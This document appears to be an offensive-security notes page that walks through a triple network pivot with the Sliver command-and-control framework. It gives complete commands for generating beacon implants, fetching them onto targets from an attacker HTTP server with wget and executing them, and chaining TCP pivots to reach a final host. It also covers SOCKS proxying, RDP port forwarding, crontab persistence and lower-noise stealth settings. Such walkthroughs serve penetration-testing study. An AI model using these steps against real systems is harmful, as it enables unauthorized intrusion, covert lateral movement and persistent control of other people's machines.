---
icon: skull
---

# Triple-Pivot-3Time

#### Network Layout

<figure><img src="../../../.gitbook/assets/image (151).png" alt=""><figcaption></figcaption></figure>

```
Kali (Attacker)
    ↓
10.10.10.0/23 (1st Network - Direct Access)
    ↓
10.10.10.0/24 (2nd Network)
    ↓
10.10.10.0/25 (3rd Network - Final Target)
```

***

#### **Level 0: Kali Machine Setup**

```bash
# Start Sliver server
sliver-server

# Create MTLS listener on your Kali
sliver > mtls -L 0.0.0.0 -l 8888

# Verify listener is running
sliver > jobs
```

**Your Kali IP (example):** Let's say it's `192.168.1.100`

***

#### **PIVOT 1: First Compromised Host (10.10.10.0/23)**

**Step 1: Generate Beacon**

```bash
sliver > generate beacon \
    --mtls 192.168.1.100:8888 \
    --os linux \
    --arch amd64 \
    --seconds 10 \
    --jitter 3 \
    --save /tmp/beacon1.elf

# For Windows target:
sliver > generate beacon \
    --mtls 192.168.1.100:8888 \
    --os windows \
    --arch amd64 \
    --format exe \
    --save /tmp/beacon1.exe
```

**Step 2: Deliver Beacon to First Target**

**Option A: HTTP Server**

```bash
# On Kali
python3 -m http.server 8000

# On target (10.10.10.5)
wget http://192.168.1.100:8000/beacon1.elf
chmod +x beacon1.elf
./beacon1.elf &
```

**Option B: Direct Upload (if you have SSH/RDP)**

```bash
scp /tmp/beacon1.elf user@10.10.10.5:/tmp/
ssh user@10.10.10.5
./beacon1.elf &
```

**Step 3: Interact with Beacon**

```bash
# Wait for callback (10 seconds based on our config)
sliver > beacons

# Output will show:
# ID        Name      Transport  Remote Address    Hostname  Username  OS/Arch    Last Check-in
# abc123    BEACON_1  mtls       10.10.10.5:xxxxx  host1     user1     linux/amd64  0s

# Use the beacon
sliver > use abc123
```

**Step 4: Setup First Pivot**

```bash
sliver (BEACON_1) > pivots tcp -l 9001

# Verify pivot is active
sliver (BEACON_1) > pivots

# Output:
# ID  Protocol  Bind Address    
# 1   tcp       0.0.0.0:9001
```

**What's happening?** Host 10.10.10.5 now has a listener on port 9001 that will relay traffic back to your Kali.

***

#### **PIVOT 2: Second Host (10.10.10.0/24)**

**Step 1: Generate Beacon for Second Pivot**

```bash
# IMPORTANT: --mtls now points to FIRST compromised host!
sliver > generate beacon \
    --mtls 10.10.10.5:9001 \
    --os linux \
    --arch amd64 \
    --seconds 10 \
    --jitter 3 \
    --save /tmp/beacon2.elf
```

**Step 2: Transfer Beacon2 to Second Host**

**Method 1: Using Sliver's Upload Feature**

```bash
# Still using BEACON_1
sliver (BEACON_1) > upload /tmp/beacon2.elf /tmp/beacon2.elf

# Start a shell on BEACON_1
sliver (BEACON_1) > shell

# In the shell, transfer to 2nd host
scp /tmp/beacon2.elf user@10.10.10.20:/tmp/
# Or
curl -o /tmp/beacon2.elf http://10.10.10.5:8000/beacon2.elf
```

**Method 2: HTTP Server on First Pivot**

```bash
# In BEACON_1 shell
cd /tmp
python3 -m http.server 8080

# On second host (10.10.10.20)
wget http://10.10.10.5:8080/beacon2.elf
chmod +x beacon2.elf
./beacon2.elf &
```

**Method 3: Direct Execution Through Beacon**

```bash
sliver (BEACON_1) > shell

# If you can reach 10.10.10.20 from here
ssh user@10.10.10.20
# Transfer and execute beacon2
```

**Step 3: Interact with Second Beacon**

```bash
# Exit BEACON_1 shell
exit

# Check for new beacon
sliver > beacons

# You should see BEACON_2
sliver > use <beacon2_id>
```

**Step 4: Setup Second Pivot**

```bash
sliver (BEACON_2) > pivots tcp -l 9002

# Verify
sliver (BEACON_2) > pivots
```

**Traffic Flow Now:**

```
Kali → 10.10.10.5:9001 → 10.10.10.20:9002 → ...
```

***

#### **PIVOT 3: Third Host - Final Target (10.10.10.0/25)**

**Step 1: Generate Final Beacon**

```bash
# Points to SECOND pivot host
sliver > generate beacon \
    --mtls 10.10.10.20:9002 \
    --os linux \
    --arch amd64 \
    --seconds 10 \
    --jitter 3 \
    --save /tmp/beacon3.elf
```

**Step 2: Transfer to Final Target**

```bash
# Use BEACON_2
sliver > use <beacon2_id>
sliver (BEACON_2) > upload /tmp/beacon3.elf /tmp/beacon3.elf
sliver (BEACON_2) > shell

# Transfer to final host (10.10.10.30)
scp /tmp/beacon3.elf user@10.10.10.30:/tmp/
```

**Or setup HTTP server on second pivot:**

```bash
# In BEACON_2 shell
cd /tmp
python3 -m http.server 8080

# On final target
wget http://10.10.10.20:8080/beacon3.elf
chmod +x beacon3.elf
./beacon3.elf &
```

**Step 3: Access Final Target**

```bash
# Check for final beacon
sliver > beacons

# Use it
sliver > use <beacon3_id>

# You're now on the final network!
sliver (BEACON_3) > shell
sliver (BEACON_3) > ifconfig
```

***

### Visual Flow Diagram

```
┌──────────────────┐
│   Kali Linux     │ 
│  192.168.1.100   │ ← MTLS Listener :8888
└────────┬─────────┘
         │
         │ Beacon1 connects via MTLS
         ↓
┌──────────────────┐
│    Host 1        │
│   10.10.10.5     │ ← TCP Pivot :9001 (Relay point)
└────────┬─────────┘
         │
         │ Beacon2 connects to 10.10.10.5:9001
         ↓
┌──────────────────┐
│    Host 2        │
│   10.10.10.20    │ ← TCP Pivot :9002 (Relay point)
└────────┬─────────┘
         │
         │ Beacon3 connects to 10.10.10.20:9002
         ↓
┌──────────────────┐
│  Final Target    │
│   10.10.10.30    │ ← Your objective!
└──────────────────┘
```

***

### Complete Command Summary

#### **On Kali:**

```bash
# 1. Start server
sliver-server

# 2. Create listener
sliver > mtls -L 0.0.0.0 -l 8888

# 3. Generate beacons (do this 3 times with different IPs)
sliver > generate beacon --mtls 192.168.1.100:8888 --os linux --save /tmp/beacon1.elf
sliver > generate beacon --mtls 10.10.10.5:9001 --os linux --save /tmp/beacon2.elf
sliver > generate beacon --mtls 10.10.10.20:9002 --os linux --save /tmp/beacon3.elf
```

#### **On Each Pivot Host:**

```bash
# After beacon connects
sliver > use <beacon_id>
sliver (beacon) > pivots tcp -l 900X  # X = 1, 2, 3...
sliver (beacon) > upload /tmp/beaconX.elf /tmp/beaconX.elf
sliver (beacon) > shell
```

***

### Useful Sliver Commands During Pivoting

#### **Monitor All Beacons**

```bash
sliver > beacons

# Detailed info
sliver > beacons -i <beacon_id>
```

#### **Check All Active Pivots**

```bash
sliver > pivots

# Kill a pivot
sliver > pivots -k <pivot_id>
```

#### **Port Forwarding Through Pivots**

```bash
# Forward RDP from final target to your Kali
sliver (BEACON_3) > portfwd add -r 10.10.10.30:3389 -l 13389

# Now RDP to localhost:13389 on Kali
rdesktop localhost:13389
```

#### **SOCKS Proxy**

```bash
# Create SOCKS proxy through any beacon
sliver (BEACON_1) > socks5 start

# Use with proxychains
proxychains nmap 10.10.10.20
proxychains firefox
```

#### **File Operations**

```bash
sliver (beacon) > upload /local/path /remote/path
sliver (beacon) > download /remote/path /local/path
sliver (beacon) > ls /path
sliver (beacon) > cd /path
```

#### **Process Management**

```bash
sliver (beacon) > ps                    # List processes
sliver (beacon) > execute /path/to/file # Run command
sliver (beacon) > execute -o ls -la     # Run with output
```

#### **Network Recon from Beacon**

```bash
sliver (beacon) > netstat
sliver (beacon) > ifconfig
sliver (beacon) > shell
# In shell:
ping 10.10.10.X
nmap 10.10.10.0/24
```

***

### Troubleshooting Common Issues

#### **Beacon Not Connecting?**

```bash
# 1. Check if listener is active
sliver > jobs

# 2. Check firewall on pivot host
# In beacon shell:
iptables -L
netstat -tulpn | grep 9001

# 3. Check beacon process is running
ps aux | grep beacon
```

#### **Slow Response?**

```bash
# Generate beacons with faster check-in
sliver > generate beacon --mtls <ip>:port --seconds 5 --jitter 1

# Convert beacon to interactive session (faster but noisier)
sliver (beacon) > interactive
```

#### **Lost Connection to Pivot?**

```bash
# Beacons auto-reconnect! Just wait for next check-in
# Check beacon status
sliver > beacons

# If beacon is dead, re-upload and execute
```

#### **Can't Transfer Files?**

```bash
# Alternative: Base64 encode
# On Kali:
base64 beacon2.elf > beacon2.b64

# Transfer text file, then decode on target
base64 -d beacon2.b64 > beacon2.elf
```

***

### Advanced

#### **Persistence on Pivots**

```bash
# Add beacon to cron
sliver (beacon) > shell
echo "*/5 * * * * /tmp/beacon1.elf" | crontab -

# Or systemd service
# Create /etc/systemd/system/beacon.service
```

#### **Stealth Settings**

```bash
# Generate with longer check-in intervals
sliver > generate beacon \
    --mtls <ip>:port \
    --seconds 60 \
    --jitter 30 \
    --skip-symbols \
    --save beacon.elf

# This checks in every 60-90 seconds (less traffic)
```

#### **Using HTTPS Instead of MTLS**

```bash
# On Kali
sliver > https -L 0.0.0.0 -l 443

# Generate with HTTPS
sliver > generate beacon --http 192.168.1.100:443
```

***
